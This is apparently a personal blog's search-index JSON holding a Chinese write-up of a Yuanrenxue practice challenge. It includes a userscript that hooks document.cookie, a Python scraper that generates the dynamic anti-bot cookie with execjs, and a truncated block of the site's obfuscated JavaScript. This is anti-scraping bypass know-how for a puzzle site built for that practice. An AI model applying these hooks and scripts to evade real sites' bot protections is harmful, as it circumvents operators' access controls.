{"meta":{"title":"个人博客","subtitle":"","description":"个人学习的一些记录。","author":"f19t","url":"https://f19t.github.io.git","root":"/"},"pages":[{"title":"标签","date":"2023-02-12T08:25:34.000Z","updated":"2023-02-13T09:31:47.571Z","comments":true,"path":"tags/index.html","permalink":"https://f19t.github.io.git/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2023-02-12T08:31:42.000Z","updated":"2023-02-13T09:31:55.647Z","comments":true,"path":"categories/index.html","permalink":"https://f19t.github.io.git/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"js混淆-动态cookie1-猿人学第2题","slug":"js混淆-动态cookie1-猿人学第2题","date":"2023-07-13T09:17:45.000Z","updated":"2023-07-13T09:19:35.227Z","comments":true,"path":"2023/07/13/js混淆-动态cookie1-猿人学第2题/","link":"","permalink":"https://f19t.github.io.git/2023/07/13/js%E6%B7%B7%E6%B7%86-%E5%8A%A8%E6%80%81cookie1-%E7%8C%BF%E4%BA%BA%E5%AD%A6%E7%AC%AC2%E9%A2%98/","excerpt":"js混淆-动态cookie1-猿人学第2题油猴hook脚本12345678910111213141516171819202122232425262728// ==UserScript==// @name cookiehook// @namespace http://tampermonkey.net/// @version 0.1// @description try to take over the world!// @author You// @match https://match.yuanrenxue.cn/match/2// @grant none// @run-at document-start// ==/UserScript==(function () &#123; &#x27;use strict&#x27;; var cookieTemp = &#x27;&#x27;; Object.defineProperty(document, &#x27;cookie&#x27;, &#123; set: function (val) &#123; if (val.indexOf(&#x27;m&#x27;) != -1) &#123; debugger; &#125; console.log(&#x27;Hook捕获到cookie设置-&gt;&#x27;, val); cookieTemp = val; return val; &#125;, get: function () &#123; return cookieTemp; &#125;, &#125;);&#125;)();","text":"js混淆-动态cookie1-猿人学第2题油猴hook脚本12345678910111213141516171819202122232425262728// ==UserScript==// @name cookiehook// @namespace http://tampermonkey.net/// @version 0.1// @description try to take over the world!// @author You// @match https://match.yuanrenxue.cn/match/2// @grant none// @run-at document-start// ==/UserScript==(function () &#123; &#x27;use strict&#x27;; var cookieTemp = &#x27;&#x27;; Object.defineProperty(document, &#x27;cookie&#x27;, &#123; set: function (val) &#123; if (val.indexOf(&#x27;m&#x27;) != -1) &#123; debugger; &#125; console.log(&#x27;Hook捕获到cookie设置-&gt;&#x27;, val); cookieTemp = val; return val; &#125;, get: function () &#123; return cookieTemp; &#125;, &#125;);&#125;)(); 解题脚本1234567891011121314151617181920212223242526272829import jsonimport execjsimport requests# Read the JavaScript code from a filewith open(&#x27;yuanrenxue2.js&#x27;, &#x27;r&#x27;) as file: js_code = file.read()# Compile and execute the JavaScript codectx = execjs.compile(js_code)url=&quot;https://match.yuanrenxue.cn/api/match/2?page=&#123;i&#125;&quot;num=[]for i in range (1,6): m=ctx.call(&#x27;getm&#x27;)+&#x27;;&#x27; headers = &#123;&quot;user-agent&quot;: &quot;yuanrenxue.project&quot;,&quot;Cookie&quot;:m&#125; req=requests.get(url.format(i=i),headers=headers) print(req.text) data = json.loads(req.text) values = [item[&#x27;value&#x27;] for item in data[&#x27;data&#x27;]] num=num+valuesaddall=sum(num)print(num)print(addall) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816826836846856866876886896906916926936946956966976986997007017027037047057067077087097107117127137147157167177187197207217227237247257267277287297307317327337347357367377387397407417427437447457467477487497507517527537547557567577587597607617627637647657667677687697707717727737747757767777787797807817827837847857867877887897907917927937947957967977987998008018028038048058068078088098108118128138148158168178188198208218228238248258268278288298308318328338348358368378388398408418428438448458468478488498508518528538548558568578588598608618628638648658668678688698708718728738748758768778788798808818828838848858868878888898908918928938948958968978988999009019029039049059069079089099109119129139149159169179189199209219229239249259269279289299309319329339349359369379389399409419429439449459469479489499509519529539549559569579589599609619629639649659669679689699709719729739749759769779789799809819829839849859869879889899909919929939949959969979989991000100110021003100410051006100710081009101010111012101310141015101610171018101910201021102210231024102510261027102810291030103110321033103410351036103710381039104010411042104310441045104610471048104910501051105210531054105510561057105810591060106110621063106410651066106710681069107010711072107310741075107610771078107910801081108210831084108510861087108810891090109110921093109410951096109710981099110011011102110311041105110611071108110911101111111211131114111511161117111811191120112111221123112411251126112711281129113011311132113311341135113611371138113911401141114211431144114511461147114811491150115111521153115411551156115711581159116011611162116311641165116611671168116911701171117211731174117511761177117811791180118111821183118411851186118711881189119011911192119311941195119611971198119912001201120212031204120512061207120812091210121112121213121412151216121712181219122012211222122312241225122612271228122912301231123212331234123512361237123812391240124112421243124412451246124712481249125012511252125312541255125612571258125912601261126212631264126512661267126812691270127112721273127412751276127712781279128012811282128312841285128612871288128912901291129212931294129512961297129812991300130113021303130413051306130713081309131013111312131313141315131613171318131913201321132213231324132513261327132813291330133113321333133413351336133713381339134013411342134313441345134613471348134913501351135213531354135513561357135813591360136113621363136413651366136713681369137013711372137313741375137613771378137913801381138213831384138513861387138813891390139113921393139413951396139713981399140014011402140314041405140614071408140914101411141214131414141514161417141814191420142114221423142414251426142714281429143014311432143314341435143614371438143914401441144214431444144514461447144814491450145114521453145414551456145714581459146014611462146314641465146614671468146914701471147214731474147514761477147814791480148114821483148414851486148714881489149014911492149314941495149614971498149915001501150215031504150515061507150815091510151115121513151415151516151715181519152015211522152315241525152615271528152915301531153215331534153515361537153815391540154115421543154415451546154715481549155015511552155315541555155615571558155915601561156215631564156515661567156815691570157115721573157415751576157715781579158015811582158315841585158615871588158915901591159215931594159515961597159815991600160116021603160416051606160716081609161016111612161316141615161616171618161916201621162216231624162516261627162816291630163116321633163416351636163716381639164016411642164316441645164616471648164916501651165216531654165516561657165816591660166116621663166416651666166716681669167016711672167316741675167616771678167916801681168216831684168516861687168816891690169116921693169416951696169716981699170017011702170317041705170617071708170917101711171217131714171517161717171817191720172117221723172417251726172717281729173017311732173317341735173617371738173917401741174217431744174517461747174817491750175117521753175417551756175717581759176017611762176317641765176617671768176917701771177217731774177517761777177817791780178117821783178417851786178717881789179017911792179317941795179617971798179918001801180218031804180518061807180818091810181118121813181418151816181718181819182018211822182318241825182618271828182918301831183218331834183518361837183818391840184118421843184418451846184718481849185018511852185318541855185618571858185918601861186218631864186518661867186818691870187118721873187418751876187718781879188018811882188318841885188618871888188918901891189218931894189518961897189818991900190119021903190419051906190719081909191019111912191319141915191619171918191919201921192219231924192519261927192819291930193119321933193419351936193719381939194019411942194319441945194619471948194919501951195219531954195519561957195819591960196119621963196419651966196719681969197019711972197319741975197619771978197919801981198219831984198519861987198819891990199119921993199419951996199719981999200020012002200320042005200620072008200920102011201220132014201520162017201820192020202120222023202420252026202720282029203020312032203320342035203620372038203920402041204220432044204520462047204820492050205120522053205420552056205720582059206020612062206320642065206620672068206920702071207220732074207520762077207820792080208120822083208420852086208720882089209020912092209320942095209620972098209921002101210221032104210521062107210821092110211121122113211421152116211721182119212021212122212321242125212621272128212921302131213221332134213521362137213821392140214121422143214421452146214721482149215021512152215321542155215621572158215921602161216221632164216521662167216821692170217121722173217421752176217721782179218021812182218321842185218621872188218921902191219221932194var window = global;window.navigator = &#123;&#125;;var out=&quot;&quot;;(function $dbsm_0x5b8433(_0x3a1505) &#123; var _0x4ae213 = &#123;&#125;; _0x4ae213[&#x27;yxnOz&#x27;] = function (_0x573309, _0x2dd383) &#123; return _0x573309 + _0x2dd383; &#125;; _0x4ae213[&#x27;nWsLh&#x27;] = &#x27;debu&#x27;; _0x4ae213[&#x27;Amczw&#x27;] = &#x27;gger&#x27;; _0x4ae213[&#x27;jlfMX&#x27;] = &#x27;action&#x27;; _0x4ae213[&#x27;GoKCJ&#x27;] = function (_0x5eb466, _0x5a8263) &#123; return _0x5eb466 === _0x5a8263; &#125;; _0x4ae213[&#x27;hcieR&#x27;] = &#x27;kltoT&#x27;; _0x4ae213[&#x27;LbcXw&#x27;] = function (_0x507b1f, _0x308684, _0x45b0c0) &#123; return _0x507b1f(_0x308684, _0x45b0c0); &#125;; _0x4ae213[&#x27;MXNEi&#x27;] = function (_0x34244a, _0x49466c) &#123; return _0x34244a !== _0x49466c; &#125;; _0x4ae213[&#x27;IVLEx&#x27;] = &#x27;JqxCL&#x27;; _0x4ae213[&#x27;KmthN&#x27;] = &#x27;jVaJw&#x27;; _0x4ae213[&#x27;VSGDW&#x27;] = &#x27;XRQDV&#x27;; _0x4ae213[&#x27;sCIhr&#x27;] = &#x27;wedjd&#x27;; _0x4ae213[&#x27;mCiFX&#x27;] = &#x27;BzSbT&#x27;; _0x4ae213[&#x27;TaLbj&#x27;] = &#x27;BcmvX&#x27;; _0x4ae213[&#x27;UaCDF&#x27;] = function (_0x17c120, _0x574389) &#123; return _0x17c120 | _0x574389; &#125;; _0x4ae213[&#x27;fQhCq&#x27;] = function (_0x12a754, _0x431346) &#123; return _0x12a754 &lt;&lt; _0x431346; &#125;; _0x4ae213[&#x27;vWlIA&#x27;] = function (_0x4fc71e, _0x5a886a) &#123; return _0x4fc71e &gt;&gt;&gt; _0x5a886a; &#125;; _0x4ae213[&#x27;rcDnK&#x27;] = function (_0x52a5d9, _0xec87e3) &#123; return _0x52a5d9 - _0xec87e3; &#125;; _0x4ae213[&#x27;MXwHr&#x27;] = function (_0x45690c, _0x147f66) &#123; return _0x45690c * _0x147f66; &#125;; _0x4ae213[&#x27;CVAPf&#x27;] = function (_0x48322a, _0x25d606) &#123; return _0x48322a &lt; _0x25d606; &#125;; _0x4ae213[&#x27;ssAqq&#x27;] = function (_0x1da758, _0x24f457) &#123; return _0x1da758 &amp; _0x24f457; &#125;; _0x4ae213[&#x27;gbHtc&#x27;] = function (_0x518238, _0x3ba1d1) &#123; return _0x518238 &gt;&gt; _0x3ba1d1; &#125;; _0x4ae213[&#x27;Dmtjq&#x27;] = function (_0x238072, _0x31dc75) &#123; return _0x238072 % _0x31dc75; &#125;; _0x4ae213[&#x27;cyCfP&#x27;] = function (_0x3a24ff, _0x360b70) &#123; return _0x3a24ff === _0x360b70; &#125;; _0x4ae213[&#x27;iiByy&#x27;] = &#x27;Jwado&#x27;; _0x4ae213[&#x27;UYQzd&#x27;] = &#x27;HilCP&#x27;; _0x4ae213[&#x27;IpXov&#x27;] = function (_0x53a8c4, _0x42db8d) &#123; return _0x53a8c4 !== _0x42db8d; &#125;; _0x4ae213[&#x27;MHjCP&#x27;] = &#x27;ZEgXY&#x27;; _0x4ae213[&#x27;QVPth&#x27;] = function (_0x483f7d, _0x1a2f5c) &#123; return _0x483f7d === _0x1a2f5c; &#125;; _0x4ae213[&#x27;qzGIL&#x27;] = &#x27;qRNpd&#x27;; _0x4ae213[&#x27;nzpYx&#x27;] = function (_0x2ad76f, _0x5579ec) &#123; return _0x2ad76f &lt;&lt; _0x5579ec; &#125;; _0x4ae213[&#x27;krJmI&#x27;] = function (_0x2fb7b5, _0x1f41a7) &#123; return _0x2fb7b5 + _0x1f41a7; &#125;; _0x4ae213[&#x27;uMSYD&#x27;] = function (_0x54bb9e, _0x3931fb) &#123; return _0x54bb9e &lt;&lt; _0x3931fb; &#125;; _0x4ae213[&#x27;SQANP&#x27;] = function (_0x5e7970, _0xc437e7) &#123; return _0x5e7970 &gt;&gt;&gt; _0xc437e7; &#125;; _0x4ae213[&#x27;XFtPv&#x27;] = function (_0x1f88c5, _0x38ee87, _0x124ca9, _0x539cce, _0x538a9f, _0x547da5, _0x25db8b, _0x4d8c11) &#123; return _0x1f88c5(_0x38ee87, _0x124ca9, _0x539cce, _0x538a9f, _0x547da5, _0x25db8b, _0x4d8c11); &#125;; _0x4ae213[&#x27;PoQLW&#x27;] = function (_0xb36e76, _0x539694, _0x54a820, _0x25b303, _0x20996a, _0x20be89, _0x2b12fb, _0x5c9b3f) &#123; return _0xb36e76(_0x539694, _0x54a820, _0x25b303, _0x20996a, _0x20be89, _0x2b12fb, _0x5c9b3f); &#125;; _0x4ae213[&#x27;QEDGw&#x27;] = function (_0x491450, _0x681771) &#123; return _0x491450 + _0x681771; &#125;; _0x4ae213[&#x27;WtRsf&#x27;] = function (_0x32dd73, _0x4de528) &#123; return _0x32dd73 + _0x4de528; &#125;; _0x4ae213[&#x27;SSXOF&#x27;] = function (_0x206394, _0x534503, _0x56571b, _0x537701, _0x3ea4fd, _0x3eb5c4, _0xbfccb8, _0x131a64) &#123; return _0x206394(_0x534503, _0x56571b, _0x537701, _0x3ea4fd, _0x3eb5c4, _0xbfccb8, _0x131a64); &#125;; _0x4ae213[&#x27;AynNc&#x27;] = function (_0x78a860, _0x22f1a7) &#123; return _0x78a860 + _0x22f1a7; &#125;; _0x4ae213[&#x27;XfyDJ&#x27;] = function (_0x5e8816, _0x279e12, _0xea0271, _0xc6fc75, _0x72d696, _0x35765e, _0x8dc203, _0x29215d) &#123; return _0x5e8816(_0x279e12, _0xea0271, _0xc6fc75, _0x72d696, _0x35765e, _0x8dc203, _0x29215d); &#125;; _0x4ae213[&#x27;OtiqQ&#x27;] = function (_0x42ca2b, _0x27abb0, _0x50a1f2, _0x57690e, _0x3bc1f3, _0x1a5cff, _0x590f17, _0x1b5714) &#123; return _0x42ca2b(_0x27abb0, _0x50a1f2, _0x57690e, _0x3bc1f3, _0x1a5cff, _0x590f17, _0x1b5714); &#125;; _0x4ae213[&#x27;TrMHm&#x27;] = function (_0x483ddb, _0x3455c0, _0x485398, _0x394aa9, _0x1a28c5, _0x36870a, _0x1646b7, _0x16f0b8) &#123; return _0x483ddb(_0x3455c0, _0x485398, _0x394aa9, _0x1a28c5, _0x36870a, _0x1646b7, _0x16f0b8); &#125;; _0x4ae213[&#x27;eaodB&#x27;] = function (_0x1fbb56, _0x2a2add, _0x339e94, _0x18e815, _0x1033cd, _0x335d0a, _0x4ac554, _0x40917f) &#123; return _0x1fbb56(_0x2a2add, _0x339e94, _0x18e815, _0x1033cd, _0x335d0a, _0x4ac554, _0x40917f); &#125;; _0x4ae213[&#x27;vxPis&#x27;] = function (_0x282971, _0x3f0809) &#123; return _0x282971 + _0x3f0809; &#125;; _0x4ae213[&#x27;hzPUk&#x27;] = function (_0x5679e8, _0x433a8c, _0x3f6e9d, _0x5ebb6f, _0x5ec290, _0x32011a, _0x3ddae7, _0x5bc889) &#123; return _0x5679e8(_0x433a8c, _0x3f6e9d, _0x5ebb6f, _0x5ec290, _0x32011a, _0x3ddae7, _0x5bc889); &#125;; _0x4ae213[&#x27;jzpLU&#x27;] = function (_0x4c5546, _0x23c4d0, _0x331dbe, _0x373cb2, _0x5693b2, _0x206064, _0x522295, _0x33269c) &#123; return _0x4c5546(_0x23c4d0, _0x331dbe, _0x373cb2, _0x5693b2, _0x206064, _0x522295, _0x33269c); &#125;; _0x4ae213[&#x27;xsyfL&#x27;] = function (_0x5853cd, _0x4133e1) &#123; return _0x5853cd + _0x4133e1; &#125;; _0x4ae213[&#x27;pXTxv&#x27;] = function (_0x1a6be5, _0x3a3fd3) &#123; return _0x1a6be5 + _0x3a3fd3; &#125;; _0x4ae213[&#x27;VGQPS&#x27;] = function (_0x555507, _0x29d57a, _0x4fe096, _0x4376a1, _0x2af782, _0x2f9961, _0x2c9098, _0x54b083) &#123; return _0x555507(_0x29d57a, _0x4fe096, _0x4376a1, _0x2af782, _0x2f9961, _0x2c9098, _0x54b083); &#125;; _0x4ae213[&#x27;Ycyjw&#x27;] = function (_0x4f3916, _0x446f9d, _0x59cba9, _0x637b42, _0x4adeb0, _0x2efdba, _0x265751, _0xf24ced) &#123; return _0x4f3916(_0x446f9d, _0x59cba9, _0x637b42, _0x4adeb0, _0x2efdba, _0x265751, _0xf24ced); &#125;; _0x4ae213[&#x27;LRMTA&#x27;] = function (_0x5db027, _0x56a870, _0x9bf816, _0x4c1a6b, _0x3b4d27, _0x54381e, _0x4b9ae5, _0x3c3e2d) &#123; return _0x5db027(_0x56a870, _0x9bf816, _0x4c1a6b, _0x3b4d27, _0x54381e, _0x4b9ae5, _0x3c3e2d); &#125;; _0x4ae213[&#x27;DfleX&#x27;] = function (_0x4634f1, _0x411f12, _0x3813f4, _0x4b5223, _0x1371f5, _0x4cc8b8, _0x400df6, _0x4308d5) &#123; return _0x4634f1(_0x411f12, _0x3813f4, _0x4b5223, _0x1371f5, _0x4cc8b8, _0x400df6, _0x4308d5); &#125;; _0x4ae213[&#x27;JjpiE&#x27;] = function (_0x2ed1ad, _0x4441be) &#123; return _0x2ed1ad + _0x4441be; &#125;; _0x4ae213[&#x27;wuuNu&#x27;] = function (_0x417700, _0x272add, _0x41f769, _0x4cc4e9, _0x3be877, _0x25765b, _0x29bc49, _0xb7d299) &#123; return _0x417700(_0x272add, _0x41f769, _0x4cc4e9, _0x3be877, _0x25765b, _0x29bc49, _0xb7d299); &#125;; _0x4ae213[&#x27;ZnJoJ&#x27;] = function (_0x5905e2, _0x4ee80d, _0x3a90b7, _0x2c4f1e, _0x4886d5, _0x44be33, _0x3cf142, _0xc33a15) &#123; return _0x5905e2(_0x4ee80d, _0x3a90b7, _0x2c4f1e, _0x4886d5, _0x44be33, _0x3cf142, _0xc33a15); &#125;; _0x4ae213[&#x27;prFIR&#x27;] = function (_0x229886, _0x131574) &#123; return _0x229886 + _0x131574; &#125;; _0x4ae213[&#x27;gkiXu&#x27;] = function (_0x34decb, _0x53d481, _0x57c738, _0x3db5cc, _0x4d5b67, _0x5321bf, _0x43bb8d, _0x4f9390) &#123; return _0x34decb(_0x53d481, _0x57c738, _0x3db5cc, _0x4d5b67, _0x5321bf, _0x43bb8d, _0x4f9390); &#125;; _0x4ae213[&#x27;ERQNz&#x27;] = function (_0x2e9ed3, _0x2279ec, _0x3cb13b, _0x500f04, _0x48c1b9, _0x59092c, _0x73b443, _0x15e5a8) &#123; return _0x2e9ed3(_0x2279ec, _0x3cb13b, _0x500f04, _0x48c1b9, _0x59092c, _0x73b443, _0x15e5a8); &#125;; _0x4ae213[&#x27;iYyGD&#x27;] = function (_0x255a19, _0x413e4b, _0x1e88e3, _0x300136, _0x345976, _0x3ed54d, _0x344b6f, _0x5cfda7) &#123; return _0x255a19(_0x413e4b, _0x1e88e3, _0x300136, _0x345976, _0x3ed54d, _0x344b6f, _0x5cfda7); &#125;; _0x4ae213[&#x27;DURtf&#x27;] = function (_0x225194, _0x570b70, _0x294e9e, _0x176e50, _0x41738a, _0x10d60c, _0x3e1965, _0x5e5bab) &#123; return _0x225194(_0x570b70, _0x294e9e, _0x176e50, _0x41738a, _0x10d60c, _0x3e1965, _0x5e5bab); &#125;; _0x4ae213[&#x27;RCsdj&#x27;] = function (_0x404460, _0x150723, _0xce003c, _0x1ef1ec, _0x2b997e, _0x80be58, _0x53e270, _0x3078ec) &#123; return _0x404460(_0x150723, _0xce003c, _0x1ef1ec, _0x2b997e, _0x80be58, _0x53e270, _0x3078ec); &#125;; _0x4ae213[&#x27;JTVjo&#x27;] = function (_0xb2f723, _0x3dbcf5) &#123; return _0xb2f723 + _0x3dbcf5; &#125;; _0x4ae213[&#x27;dFxVd&#x27;] = function (_0xe36a2, _0xdaa316, _0xa4a7aa, _0x43ff14, _0x2f6ef5, _0x5f241a, _0x1178cf, _0x37a30b) &#123; return _0xe36a2(_0xdaa316, _0xa4a7aa, _0x43ff14, _0x2f6ef5, _0x5f241a, _0x1178cf, _0x37a30b); &#125;; _0x4ae213[&#x27;jPZqC&#x27;] = function (_0x4a95c3, _0x6c0e8e, _0x14f537) &#123; return _0x4a95c3(_0x6c0e8e, _0x14f537); &#125;; _0x4ae213[&#x27;EHbgY&#x27;] = &#x27;4|0|2|&#x27; + &#x27;1|3&#x27;; _0x4ae213[&#x27;LIygl&#x27;] = function (_0x3b9cb1, _0x2009c4) &#123; return _0x3b9cb1 &amp; _0x2009c4; &#125;; _0x4ae213[&#x27;kQkHC&#x27;] = function (_0xc7e553, _0x36cd2e) &#123; return _0xc7e553 / _0x36cd2e; &#125;; _0x4ae213[&#x27;wmPFZ&#x27;] = function (_0x239d5a, _0x372d92) &#123; return _0x239d5a % _0x372d92; &#125;; _0x4ae213[&#x27;OwNDF&#x27;] = function (_0x4ae1c7, _0x5e2f3c) &#123; return _0x4ae1c7 * _0x5e2f3c; &#125;; _0x4ae213[&#x27;XQWju&#x27;] = function (_0x2bc566, _0x39418a) &#123; return _0x2bc566 !== _0x39418a; &#125;; _0x4ae213[&#x27;LqxMr&#x27;] = &#x27;aIuNu&#x27;; _0x4ae213[&#x27;NPiKO&#x27;] = &#x27;kesGU&#x27;; _0x4ae213[&#x27;bKMqa&#x27;] = function (_0x14f97c, _0x46c454) &#123; return _0x14f97c === _0x46c454; &#125;; _0x4ae213[&#x27;mWpTQ&#x27;] = &#x27;ZVyoD&#x27;; _0x4ae213[&#x27;hwnAi&#x27;] = &#x27;ySgaW&#x27;; _0x4ae213[&#x27;CYrAw&#x27;] = function (_0x41b36f, _0x4ae8df) &#123; return _0x41b36f + _0x4ae8df; &#125;; _0x4ae213[&#x27;bYoPt&#x27;] = function (_0x2dea46, _0x5e1ffd) &#123; return _0x2dea46 &amp; _0x5e1ffd; &#125;; _0x4ae213[&#x27;QJvhz&#x27;] = function (_0x168afa, _0x19ab49) &#123; return _0x168afa &amp; _0x19ab49; &#125;; _0x4ae213[&#x27;zYbtJ&#x27;] = function (_0xb8e7b5, _0x27aa1d) &#123; return _0xb8e7b5 | _0x27aa1d; &#125;; _0x4ae213[&#x27;YYVft&#x27;] = function (_0x366888, _0x463b28) &#123; return _0x366888 + _0x463b28; &#125;; _0x4ae213[&#x27;BqISi&#x27;] = function (_0x1a34ed, _0x458525) &#123; return _0x1a34ed &gt;&gt; _0x458525; &#125;; _0x4ae213[&#x27;nuNNJ&#x27;] = function (_0x249e3c, _0x450ad9) &#123; return _0x249e3c &amp; _0x450ad9; &#125;; _0x4ae213[&#x27;xhmaS&#x27;] = &#x27;while &#x27; + &#x27;(tr&#x27; + &#x27;ue)&#x27; + &#x27; &#123;&#125;&#x27;; _0x4ae213[&#x27;PnrcM&#x27;] = &#x27;counte&#x27; + &#x27;r&#x27;; _0x4ae213[&#x27;XVzfB&#x27;] = function (_0x1c33ee, _0x1452dc) &#123; return _0x1c33ee === _0x1452dc; &#125;; _0x4ae213[&#x27;FyJGD&#x27;] = &#x27;hKati&#x27;; _0x4ae213[&#x27;OkiQr&#x27;] = function (_0x1025d3, _0x520a36) &#123; return _0x1025d3 &lt;&lt; _0x520a36; &#125;; _0x4ae213[&#x27;JNzFX&#x27;] = function (_0x59dbb8, _0x208fae) &#123; return _0x59dbb8 !== _0x208fae; &#125;; _0x4ae213[&#x27;GpLBB&#x27;] = &#x27;sRGUP&#x27;; _0x4ae213[&#x27;NVbry&#x27;] = function (_0x35ccc0, _0xe00a5, _0x1eef07) &#123; return _0x35ccc0(_0xe00a5, _0x1eef07); &#125;; _0x4ae213[&#x27;YaYjT&#x27;] = function (_0x14645f, _0x24ac0f, _0x4ac009) &#123; return _0x14645f(_0x24ac0f, _0x4ac009); &#125;; _0x4ae213[&#x27;VZoSq&#x27;] = function (_0x308978, _0x161a5a, _0x48491b) &#123; return _0x308978(_0x161a5a, _0x48491b); &#125;; _0x4ae213[&#x27;SZbng&#x27;] = &#x27;functi&#x27; + &#x27;on &#x27; + &#x27;*\\\\(&#x27; + &#x27; *\\\\&#x27; + &#x27;)&#x27;; _0x4ae213[&#x27;ALjwl&#x27;] = &#x27;\\\\+\\\\+ *&#x27; + &#x27;(?:&#x27; + &#x27;[a-&#x27; + &#x27;zA-&#x27; + &#x27;Z_$&#x27; + &#x27;][0&#x27; + &#x27;-9a&#x27; + &#x27;-zA&#x27; + &#x27;-Z_&#x27; + &#x27;$]*&#x27; + &#x27;)&#x27;; _0x4ae213[&#x27;gqyYS&#x27;] = function (_0x54d641, _0x33cd2c) &#123; return _0x54d641(_0x33cd2c); &#125;; _0x4ae213[&#x27;mRFZC&#x27;] = &#x27;init&#x27;; _0x4ae213[&#x27;xOvuJ&#x27;] = &#x27;chain&#x27;; _0x4ae213[&#x27;MEWpP&#x27;] = function (_0x27ca23, _0x521650) &#123; return _0x27ca23 + _0x521650; &#125;; _0x4ae213[&#x27;nOzUs&#x27;] = &#x27;input&#x27;; _0x4ae213[&#x27;EmmWG&#x27;] = function (_0xa4e7da) &#123; return _0xa4e7da(); &#125;; _0x4ae213[&#x27;ypEKp&#x27;] = &#x27;hrEKm&#x27;; _0x4ae213[&#x27;agUQI&#x27;] = function (_0x268a12, _0x38727a, _0x1ddaf7, _0x318d04, _0x10f131, _0x4f2166, _0x5270f0) &#123; return _0x268a12(_0x38727a, _0x1ddaf7, _0x318d04, _0x10f131, _0x4f2166, _0x5270f0); &#125;; _0x4ae213[&#x27;wbORN&#x27;] = function (_0x82e881, _0x233271) &#123; return _0x82e881 &amp; _0x233271; &#125;; _0x4ae213[&#x27;NHJXq&#x27;] = function (_0x571cc8, _0x4e4d48) &#123; return _0x571cc8 &amp; _0x4e4d48; &#125;; _0x4ae213[&#x27;lDxHO&#x27;] = &#x27;hdaxj&#x27;; _0x4ae213[&#x27;pjzIs&#x27;] = &#x27;UUlhP&#x27;; _0x4ae213[&#x27;jNboj&#x27;] = function (_0x31e406, _0x3f3b0a, _0x3521d2, _0x3d2a6f, _0x44d237, _0x4a621c, _0x131059) &#123; return _0x31e406(_0x3f3b0a, _0x3521d2, _0x3d2a6f, _0x44d237, _0x4a621c, _0x131059); &#125;; _0x4ae213[&#x27;mkMNH&#x27;] = function (_0x13e49f, _0x127b56) &#123; return _0x13e49f | _0x127b56; &#125;; _0x4ae213[&#x27;mMBVi&#x27;] = function (_0x5a5684, _0x3194b7, _0x38fba0, _0x468b81, _0x14bc17, _0x3321a1, _0x58aa7c) &#123; return _0x5a5684(_0x3194b7, _0x38fba0, _0x468b81, _0x14bc17, _0x3321a1, _0x58aa7c); &#125;; _0x4ae213[&#x27;wtWWS&#x27;] = function (_0x200f65, _0x76a333) &#123; return _0x200f65 ^ _0x76a333; &#125;; _0x4ae213[&#x27;hYAIe&#x27;] = function (_0xa84368, _0x5e741f) &#123; return _0xa84368 | _0x5e741f; &#125;; _0x4ae213[&#x27;xDRSh&#x27;] = function (_0xa743ba, _0x438b2a) &#123; return _0xa743ba === _0x438b2a; &#125;; _0x4ae213[&#x27;NWMCM&#x27;] = &#x27;laqtB&#x27;; _0x4ae213[&#x27;UmyDv&#x27;] = &#x27;OSlWA&#x27;; _0x4ae213[&#x27;efMcx&#x27;] = function (_0x39070e, _0x53541d) &#123; return _0x39070e &lt; _0x53541d; &#125;; _0x4ae213[&#x27;gAaGi&#x27;] = &#x27;brtAR&#x27;; _0x4ae213[&#x27;xxRAh&#x27;] = function (_0x43ba86, _0xcdc9fb, _0x54b347) &#123; return _0x43ba86(_0xcdc9fb, _0x54b347); &#125;; _0x4ae213[&#x27;HCbMb&#x27;] = &#x27;WDtJq&#x27;; _0x4ae213[&#x27;IlJZf&#x27;] = function (_0x50876e, _0x26ef9f, _0x13f5da, _0x93db6b, _0x304924, _0x1dac4a, _0x352c57) &#123; return _0x50876e(_0x26ef9f, _0x13f5da, _0x93db6b, _0x304924, _0x1dac4a, _0x352c57); &#125;; _0x4ae213[&#x27;gMVnS&#x27;] = function (_0x5a4ca0, _0x3d5ad4) &#123; return _0x5a4ca0 ^ _0x3d5ad4; &#125;; _0x4ae213[&#x27;udmam&#x27;] = &#x27;jiIjh&#x27;; _0x4ae213[&#x27;hYPSY&#x27;] = function (_0x3495ad, _0x289874, _0x4f79a6, _0x21ada4, _0x19f472, _0x273812, _0x289e5b) &#123; return _0x3495ad(_0x289874, _0x4f79a6, _0x21ada4, _0x19f472, _0x273812, _0x289e5b); &#125;; _0x4ae213[&#x27;YvOmk&#x27;] = function (_0x12d38d, _0x361239) &#123; return _0x12d38d ^ _0x361239; &#125;; _0x4ae213[&#x27;ZNXmk&#x27;] = function (_0x1c9abb, _0x254e8a) &#123; return _0x1c9abb | _0x254e8a; &#125;; _0x4ae213[&#x27;WobZM&#x27;] = function (_0x340cc8, _0x23d817) &#123; return _0x340cc8 + _0x23d817; &#125;; _0x4ae213[&#x27;rPTbH&#x27;] = function (_0x4e1022, _0x299a56) &#123; return _0x4e1022 &amp; _0x299a56; &#125;; _0x4ae213[&#x27;BGGfU&#x27;] = function (_0x53757c, _0xdbc927) &#123; return _0x53757c + _0xdbc927; &#125;; _0x4ae213[&#x27;ySNJR&#x27;] = function (_0x11e9f9, _0x14aa38) &#123; return _0x11e9f9 + _0x14aa38; &#125;; _0x4ae213[&#x27;WLBFS&#x27;] = function (_0x4616e5, _0x37dbe0) &#123; return _0x4616e5 &amp; _0x37dbe0; &#125;; _0x4ae213[&#x27;vBqUb&#x27;] = function (_0x1f7b49, _0x11693d) &#123; return 